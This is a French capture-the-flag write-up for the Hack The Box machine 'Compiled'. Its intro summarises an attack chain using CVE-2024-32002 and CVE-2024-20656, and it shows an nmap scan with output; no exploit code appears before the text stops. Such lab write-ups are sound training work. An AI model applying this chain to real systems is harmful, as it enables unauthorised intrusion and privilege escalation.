<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Compiled</title>
<meta name=description content="Platforme: Hack The Box Lien: Compiled Niveau: Moyen OS: Windows Lire cet article en anglais
Compiled débute par la découverte d&amp;rsquo;une instance Gitea sur le …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-compiled/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Compiled"><meta property="og:description" content="Platforme: Hack The Box Lien: Compiled Niveau: Moyen OS: Windows Lire cet article en anglais
Compiled débute par la découverte d&amp;rsquo;une instance Gitea sur le …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Compiled/Compiled.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Compiled/Compiled.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Compiled"><meta name=twitter:description content="Platforme: Hack The Box Lien: Compiled Niveau: Moyen OS: Windows Lire cet article en anglais
Compiled débute par la découverte d&amp;rsquo;une instance Gitea sur le …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-compiled/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-compiled/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Compiled/Compiled.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-compiled/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-compiled/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Compiled</h1><small role=doc-subtitle></small><p class=post-date>12 min read |
<span class=post-date>13 Décembre 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platforme: Hack The Box</li><li>Lien: <a href=https://app.hackthebox.com/machines/Compiled>Compiled</a></li><li>Niveau: Moyen</li><li>OS: Windows</li></ul><hr><p><a href=https://scorpiosec.com/posts/htb-compiled/>Lire cet article en anglais</a></p><p>Compiled débute par la découverte d&rsquo;une instance Gitea sur le port 3000 et d&rsquo;un service de compilation sur le port 5000. En exploitant une vulnérabilité de Git (<code>CVE-2024-32002</code>), nous obtenons un accès initial. En explorant le système, nous découvrons un fichier de base de données contenant des hachages d&rsquo;utilisateurs et d&rsquo;autres informations critiques, nous permettant de trouver un mot de passe et d&rsquo;effectuer un mouvement latéral. L&rsquo;énumération du système mène à des fichiers liés à Visual Studio 2019, conduisant à la découverte du <code>CVE-2024-20656</code>. En personnalisant et en compilant une preuve de concept (PoC), nous exploitons un service s&rsquo;exécutant en tant que <code>LocalSystem</code> pour accéder au compte root.</p><p>Adresse IP cible - <code>10.10.11.26</code></p><h2 id=balayage>Balayage</h2><pre tabindex=0><code>nmap -sC -sV -Pn -oA nmap/Compiled 10.10.11.26
</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-12-12 14:21 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.26
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.072s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>998</span> filtered tcp ports <span style=color:#56b6c2>(</span>no-response<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE VERSION
</span></span><span style=display:flex><span>3000/tcp open  ppp?
</span></span><span style=display:flex><span>| fingerprint-strings: 
</span></span><span style=display:flex><span>|   GenericLines, Help, RTSPRequest: 
</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#d19a66>400</span> Bad Request
</span></span><span style=display:flex><span>|     Content-Type: text/plain; <span style=color:#e06c75>charset</span><span style=color:#56b6c2>=</span>utf-8
</span></span><span style=display:flex><span>|     Connection: close
</span></span><span style=display:flex><span>|     Request
</span></span><span style=display:flex><span>|   GetRequest: 
</span></span><span style=display:flex><span>|     HTTP/1.0 <span style=color:#d19a66>200</span> OK
</span></span><span style=display:flex><span>|     Cache-Control: max-age<span style=color:#56b6c2>=</span>0, private, must-revalidate, no-transform
</span></span><span style=display:flex><span>|     Content-Type: text/html; <span style=color:#e06c75>charset</span><span style=color:#56b6c2>=</span>utf-8
</span></span><span style=display:flex><span>|     Set-Cookie: <span style=color:#e06c75>i_like_gitea</span><span style=color:#56b6c2>=</span>7f989393b9d73791; <span style=color:#e06c75>Path</span><span style=color:#56b6c2>=</span>/; HttpOnly; <span style=color:#e06c75>SameSite</span><span style=color:#56b6c2>=</span>Lax
</span></span><span style=display:flex><span>|     Set-Cookie: <span style=color:#e06c75>_csrf</span><span style=color:#56b6c2>=</span>aVSW1KqfHyBa9Imz4uy8TuiagFw6MTczNDAzNDk3NjkzNjg4NjkwMA; <span style=color:#e06c75>Path</span><span style=color:#56b6c2>=</span>/; Max-Age<span style=color:#56b6c2>=</span>86400; HttpOnly; <span style=color:#e06c75>SameSite</span><span style=color:#56b6c2>=</span>Lax
</span></span><span style=display:flex><span>|     X-Frame-Options: SAMEORIGIN
</span></span><span style=display:flex><span>|     Date: Thu, <span style=color:#d19a66>12</span> Dec <span style=color:#d19a66>2024</span> 20:22:56 GMT
</span></span><span style=display:flex><span>|     &lt;!DOCTYPE html&gt;
</span></span><span style=display:flex><span>|     &lt;html <span style=color:#e06c75>lang</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;en-US&#34;</span> <span style=color:#e06c75>class</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;theme-arc-green&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;head&gt;
</span></span><span style=display:flex><span>|     &lt;meta <span style=color:#e06c75>name</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;viewport&#34;</span> <span style=color:#e06c75>content</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;width=device-width, initial-scale=1&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;title&gt;Git&lt;/title&gt;
</span></span><span style=display:flex><span>|     &lt;link <span style=color:#e06c75>rel</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;manifest&#34;</span> <span style=color:#e06c75>href</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;data:application/json;base64,eyJuYW1lIjoiR2l0Iiwic2hvcnRfbmFtZSI6IkdpdCIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jb21waWxlZC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNvbXBpbGVkLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vZ2l0ZWEuY29tcGlsZWQuaHRiOjMwMDA
</span></span></span><span style=display:flex><span><span style=color:#98c379>|   HTTPOptions: 
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     HTTP/1.0 405 Method Not Allowed
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     Allow: HEAD
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     Allow: HEAD
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     Allow: GET
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     Cache-Control: max-age=0, private, must-revalidate, no-transform
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     Set-Cookie: i_like_gitea=7277a535e35440ef; Path=/; HttpOnly; SameSite=Lax
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     Set-Cookie: _csrf=jbSopQ2xI6EjIO9rUIzxJnkVP-I6MTczNDAzNDk4MjU2NzU3OTcwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     X-Frame-Options: SAMEORIGIN
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     Date: Thu, 12 Dec 2024 20:23:02 GMT
</span></span></span><span style=display:flex><span><span style=color:#98c379>|_    Content-Length: 0
</span></span></span><span style=display:flex><span><span style=color:#98c379>5000/tcp open  upnp?
</span></span></span><span style=display:flex><span><span style=color:#98c379>| fingerprint-strings: 
</span></span></span><span style=display:flex><span><span style=color:#98c379>|   GetRequest: 
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     HTTP/1.1 200 OK
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     Server: Werkzeug/3.0.3 Python/3.12.3
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     Date: Thu, 12 Dec 2024 20:22:56 GMT
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     Content-Type: text/html; charset=utf-8
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     Content-Length: 5234
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     Connection: close
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     &lt;!DOCTYPE html&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     &lt;html lang=&#34;</span>en<span style=color:#98c379>&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     &lt;head&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     &lt;meta charset=&#34;</span>UTF-8<span style=color:#98c379>&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     &lt;meta name=&#34;</span>viewport<span style=color:#98c379>&#34; content=&#34;</span><span style=color:#e06c75>width</span><span style=color:#56b6c2>=</span>device-width, initial-scale<span style=color:#56b6c2>=</span>1.0<span style=color:#98c379>&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     &lt;title&gt;Compiled - Code Compiling Services&lt;/title&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     &lt;!-- Bootstrap CSS --&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     &lt;link rel=&#34;</span>stylesheet<span style=color:#98c379>&#34; href=&#34;</span>https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css<span style=color:#98c379>&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     &lt;!-- Custom CSS --&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     &lt;style&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     your custom CSS here */
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     body {
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     font-family: &#39;Ubuntu Mono&#39;, monospace;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     background-color: #272822;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     color: #ddd;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     .jumbotron {
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     background-color: #1e1e1e;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     color: #fff;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     padding: 100px 20px;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     margin-bottom: 0;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     .services {
</span></span></span><span style=display:flex><span><span style=color:#98c379>|   RTSPRequest: 
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     &lt;!DOCTYPE HTML&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     &lt;html lang=&#34;</span>en<span style=color:#98c379>&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     &lt;head&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     &lt;meta charset=&#34;</span>utf-8<span style=color:#98c379>&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     &lt;title&gt;Error response&lt;/title&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     &lt;/head&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     &lt;body&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     &lt;h1&gt;Error response&lt;/h1&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     &lt;p&gt;Error code: 400&lt;/p&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     &lt;p&gt;Message: Bad request version (&#39;RTSP/1.0&#39;).&lt;/p&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     &lt;p&gt;Error code explanation: 400 - Bad request syntax or unsupported method.&lt;/p&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|     &lt;/body&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>|_    &lt;/html&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span></span><span style=display:flex><span><span style=color:#98c379>==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF-Port3000-TCP:V=7.94SVN%I=7%D=12/12%Time=675B4620%P=x86_64-pc-linux-gnu%
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:r(GenericLines,67,&#34;</span>HTTP/1<span style=color:#98c379>\.</span>1<span style=color:#98c379>\x</span>20400<span style=color:#98c379>\x</span>20Bad<span style=color:#98c379>\x</span>20Request<span style=color:#98c379>\r\n</span>Content-Type:<span style=color:#98c379>\
</span></span></span><span style=display:flex><span><span style=color:#98c379></span>SF:x20text/plain;<span style=color:#98c379>\x</span>20charset<span style=color:#56b6c2>=</span>utf-8<span style=color:#98c379>\r\n</span>Connection:<span style=color:#98c379>\x</span>20close<span style=color:#98c379>\r\n\r\n</span>400<span style=color:#98c379>\x</span>20B
</span></span><span style=display:flex><span>SF:ad<span style=color:#98c379>\x</span>20Request<span style=color:#98c379>&#34;)%r(GetRequest,37D5,&#34;</span>HTTP/1<span style=color:#98c379>\.</span>0<span style=color:#98c379>\x</span>20200<span style=color:#98c379>\x</span>20OK<span style=color:#98c379>\r\n</span>Cache-Cont
</span></span><span style=display:flex><span>SF:rol:<span style=color:#98c379>\x</span>20max-age<span style=color:#56b6c2>=</span>0,<span style=color:#98c379>\x</span>20private,<span style=color:#98c379>\x</span>20must-revalidate,<span style=color:#98c379>\x</span>20no-transform<span style=color:#98c379>\r\n</span>C
</span></span><span style=display:flex><span>SF:ontent-Type:<span style=color:#98c379>\x</span>20text/html;<span style=color:#98c379>\x</span>20charset<span style=color:#56b6c2>=</span>utf-8<span style=color:#98c379>\r\n</span>Set-Cookie:<span style=color:#98c379>\x</span>20i_like_gi
</span></span><span style=display:flex><span>SF:tea<span style=color:#56b6c2>=</span>7f989393b9d73791;<span style=color:#98c379>\x</span>20Path<span style=color:#56b6c2>=</span>/;<span style=color:#98c379>\x</span>20HttpOnly;<span style=color:#98c379>\x</span>20SameSite<span style=color:#56b6c2>=</span>Lax<span style=color:#98c379>\r\n</span>Set-Co
</span></span><span style=display:flex><span>SF:okie:<span style=color:#98c379>\x</span>20_csrf<span style=color:#56b6c2>=</span>aVSW1KqfHyBa9Imz4uy8TuiagFw6MTczNDAzNDk3NjkzNjg4NjkwMA;<span style=color:#98c379>\
</span></span></span><span style=display:flex><span><span style=color:#98c379></span>SF:x20Path<span style=color:#56b6c2>=</span>/;<span style=color:#98c379>\x</span>20Max-Age<span style=color:#56b6c2>=</span>86400;<span style=color:#98c379>\x</span>20HttpOnly;<span style=color:#98c379>\x</span>20SameSite<span style=color:#56b6c2>=</span>Lax<span style=color:#98c379>\r\n</span>X-Frame-Op
</span></span><span style=display:flex><span>SF:tions:<span style=color:#98c379>\x</span>20SAMEORIGIN<span style=color:#98c379>\r\n</span>Date:<span style=color:#98c379>\x</span>20Thu,<span style=color:#98c379>\x</span>2012<span style=color:#98c379>\x</span>20Dec<span style=color:#98c379>\x</span>202024<span style=color:#98c379>\x</span>2020:22:56<span style=color:#98c379>\
</span></span></span><span style=display:flex><span><span style=color:#98c379></span>SF:x20GMT<span style=color:#98c379>\r\n\r\n</span>&lt;!DOCTYPE<span style=color:#98c379>\x</span>20html&gt;<span style=color:#98c379>\n</span>&lt;html<span style=color:#98c379>\x</span>20lang<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>en-US<span style=color:#98c379>\&#34;\x</span>20class<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>th
</span></span><span style=display:flex><span>SF:eme-arc-green<span style=color:#98c379>\&#34;</span>&gt;<span style=color:#98c379>\n</span>&lt;head&gt;<span style=color:#98c379>\n\t</span>&lt;meta<span style=color:#98c379>\x</span>20name<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>viewport<span style=color:#98c379>\&#34;\x</span>20content<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>wid
</span></span><span style=display:flex><span>SF:th<span style=color:#56b6c2>=</span>device-width,<span style=color:#98c379>\x</span>20initial-scale<span style=color:#56b6c2>=</span>1<span style=color:#98c379>\&#34;</span>&gt;<span style=color:#98c379>\n\t</span>&lt;title&gt;Git&lt;/title&gt;<span style=color:#98c379>\n\t</span>&lt;link<span style=color:#98c379>\x</span>
</span></span><span style=display:flex><span>SF:20rel<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>manifest<span style=color:#98c379>\&#34;\x</span>20href<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>data:application/json;base64,eyJuYW1lIjoiR
</span></span><span style=display:flex><span>SF:2l0Iiwic2hvcnRfbmFtZSI6IkdpdCIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jb21w
</span></span><span style=display:flex><span>SF:aWxlZC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNvbXBpbGV
</span></span><span style=display:flex><span>SF:kLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2
</span></span><span style=display:flex><span>SF:l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vZ2l0ZWEuY29tcGlsZWQuaHRiOjMwM
</span></span><span style=display:flex><span>SF:DA<span style=color:#98c379>&#34;)%r(Help,67,&#34;</span>HTTP/1<span style=color:#98c379>\.</span>1<span style=color:#98c379>\x</span>20400<span style=color:#98c379>\x</span>20Bad<span style=color:#98c379>\x</span>20Request<span style=color:#98c379>\r\n</span>Content-Type:<span style=color:#98c379>\x</span><span style=color:#d19a66>20</span>
</span></span><span style=display:flex><span>SF:text/plain;<span style=color:#98c379>\x</span>20charset<span style=color:#56b6c2>=</span>utf-8<span style=color:#98c379>\r\n</span>Connection:<span style=color:#98c379>\x</span>20close<span style=color:#98c379>\r\n\r\n</span>400<span style=color:#98c379>\x</span>20Bad<span style=color:#98c379>\
</span></span></span><span style=display:flex><span><span style=color:#98c379></span>SF:x20Request<span style=color:#98c379>&#34;)%r(HTTPOptions,1A4,&#34;</span>HTTP/1<span style=color:#98c379>\.</span>0<span style=color:#98c379>\x</span>20405<span style=color:#98c379>\x</span>20Method<span style=color:#98c379>\x</span>20Not<span style=color:#98c379>\x</span>20Al
</span></span><span style=display:flex><span>SF:lowed<span style=color:#98c379>\r\n</span>Allow:<span style=color:#98c379>\x</span>20HEAD<span style=color:#98c379>\r\n</span>Allow:<span style=color:#98c379>\x</span>20HEAD<span style=color:#98c379>\r\n</span>Allow:<span style=color:#98c379>\x</span>20GET<span style=color:#98c379>\r\n</span>Cache-Con
</span></span><span style=display:flex><span>SF:trol:<span style=color:#98c379>\x</span>20max-age<span style=color:#56b6c2>=</span>0,<span style=color:#98c379>\x</span>20private,<span style=color:#98c379>\x</span>20must-revalidate,<span style=color:#98c379>\x</span>20no-transform<span style=color:#98c379>\r\n</span>
</span></span><span style=display:flex><span>SF:Set-Cookie:<span style=color:#98c379>\x</span>20i_like_gitea<span style=color:#56b6c2>=</span>7277a535e35440ef;<span style=color:#98c379>\x</span>20Path<span style=color:#56b6c2>=</span>/;<span style=color:#98c379>\x</span>20HttpOnly;<span style=color:#98c379>\x</span>
</span></span><span style=display:flex><span>SF:20SameSite<span style=color:#56b6c2>=</span>Lax<span style=color:#98c379>\r\n</span>Set-Cookie:<span style=color:#98c379>\x</span>20_csrf<span style=color:#56b6c2>=</span>jbSopQ2xI6EjIO9rUIzxJnkVP-I6MTcz
</span></span><span style=display:flex><span>SF:NDAzNDk4MjU2NzU3OTcwMA;<span style=color:#98c379>\x</span>20Path<span style=color:#56b6c2>=</span>/;<span style=color:#98c379>\x</span>20Max-Age<span style=color:#56b6c2>=</span>86400;<span style=color:#98c379>\x</span>20HttpOnly;<span style=color:#98c379>\x</span>20Sa
</span></span><span style=display:flex><span>SF:meSite<span style=color:#56b6c2>=</span>Lax<span style=color:#98c379>\r\n</span>X-Frame-Options:<span style=color:#98c379>\x</span>20SAMEORIGIN<span style=color:#98c379>\r\n</span>Date:<span style=color:#98c379>\x</span>20Thu,<span style=color:#98c379>\x</span>2012<span style=color:#98c379>\x</span><span style=color:#d19a66>20</span>
</span></span><span style=display:flex><span>SF:Dec<span style=color:#98c379>\x</span>202024<span style=color:#98c379>\x</span>2020:23:02<span style=color:#98c379>\x</span>20GMT<span style=color:#98c379>\r\n</span>Content-Length:<span style=color:#98c379>\x</span>200<span style=color:#98c379>\r\n\r\n</span><span style=color:#98c379>&#34;)%r(RTSP
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:Request,67,&#34;</span>HTTP/1<span style=color:#98c379>\.</span>1<span style=color:#98c379>\x</span>20400<span style=color:#98c379>\x</span>20Bad<span style=color:#98c379>\x</span>20Request<span style=color:#98c379>\r\n</span>Content-Type:<span style=color:#98c379>\x</span>20text
</span></span><span style=display:flex><span>SF:/plain;<span style=color:#98c379>\x</span>20charset<span style=color:#56b6c2>=</span>utf-8<span style=color:#98c379>\r\n</span>Connection:<span style=color:#98c379>\x</span>20close<span style=color:#98c379>\r\n\r\n</span>400<span style=color:#98c379>\x</span>20Bad<span style=color:#98c379>\x</span>20R
</span></span><span style=display:flex><span>SF:equest<span style=color:#98c379>&#34;);
</span></span></span><span style=display:flex><span><span style=color:#98c379>==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF-Port5000-TCP:V=7.94SVN%I=7%D=12/12%Time=675B4621%P=x86_64-pc-linux-gnu%
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:r(GetRequest,1521,&#34;</span>HTTP/1<span style=color:#98c379>\.</span>1<span style=color:#98c379>\x</span>20200<span style=color:#98c379>\x</span>20OK<span style=color:#98c379>\r\n</span>Server:<span style=color:#98c379>\x</span>20Werkzeug/3<span style=color:#98c379>\.</span>0<span style=color:#98c379>\.</span>
</span></span><span style=display:flex><span>SF:3<span style=color:#98c379>\x</span>20Python/3<span style=color:#98c379>\.</span>12<span style=color:#98c379>\.</span>3<span style=color:#98c379>\r\n</span>Date:<span style=color:#98c379>\x</span>20Thu,<span style=color:#98c379>\x</span>2012<span style=color:#98c379>\x</span>20Dec<span style=color:#98c379>\x</span>202024<span style=color:#98c379>\x</span>2020:22:56<span style=color:#98c379>\
</span></span></span><span style=display:flex><span><span style=color:#98c379></span>SF:x20GMT<span style=color:#98c379>\r\n</span>Content-Type:<span style=color:#98c379>\x</span>20text/html;<span style=color:#98c379>\x</span>20charset<span style=color:#56b6c2>=</span>utf-8<span style=color:#98c379>\r\n</span>Content-Lengt
</span></span><span style=display:flex><span>SF:h:<span style=color:#98c379>\x</span>205234<span style=color:#98c379>\r\n</span>Connection:<span style=color:#98c379>\x</span>20close<span style=color:#98c379>\r\n\r\n</span>&lt;!DOCTYPE<span style=color:#98c379>\x</span>20html&gt;<span style=color:#98c379>\n</span>&lt;html<span style=color:#98c379>\x</span><span style=color:#d19a66>20</span>
</span></span><span style=display:flex><span>SF:lang<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>en<span style=color:#98c379>\&#34;</span>&gt;<span style=color:#98c379>\n</span>&lt;head&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;meta<span style=color:#98c379>\x</span>20charset<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>UTF-8<span style=color:#98c379>\&#34;</span>&gt;<span style=color:#98c379>\n\x</span><span style=color:#d19a66>20</span>
</span></span><span style=display:flex><span>SF:<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;meta<span style=color:#98c379>\x</span>20name<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>viewport<span style=color:#98c379>\&#34;\x</span>20content<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span><span style=color:#e06c75>width</span><span style=color:#56b6c2>=</span>device-width,
</span></span><span style=display:flex><span>SF:<span style=color:#98c379>\x</span>20initial-scale<span style=color:#56b6c2>=</span>1<span style=color:#98c379>\.</span>0<span style=color:#98c379>\&#34;</span>&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;title&gt;Compiled<span style=color:#98c379>\x</span>20-<span style=color:#98c379>\x</span>20Code
</span></span><span style=display:flex><span>SF:<span style=color:#98c379>\x</span>20Compiling<span style=color:#98c379>\x</span>20Services&lt;/title&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;!--<span style=color:#98c379>\x</span>20Bootstrap<span style=color:#98c379>\x</span><span style=color:#d19a66>2</span>
</span></span><span style=display:flex><span>SF:0CSS<span style=color:#98c379>\x</span>20--&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;link<span style=color:#98c379>\x</span>20rel<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>stylesheet<span style=color:#98c379>\&#34;\x</span>20href<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>http
</span></span><span style=display:flex><span>SF:s://stackpath<span style=color:#98c379>\.</span>bootstrapcdn<span style=color:#98c379>\.</span>com/bootstrap/4<span style=color:#98c379>\.</span>5<span style=color:#98c379>\.</span>2/css/bootstrap<span style=color:#98c379>\.</span>min<span style=color:#98c379>\.</span>
</span></span><span style=display:flex><span>SF:css<span style=color:#98c379>\&#34;</span>&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;!--<span style=color:#98c379>\x</span>20Custom<span style=color:#98c379>\x</span>20CSS<span style=color:#98c379>\x</span>20--&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;
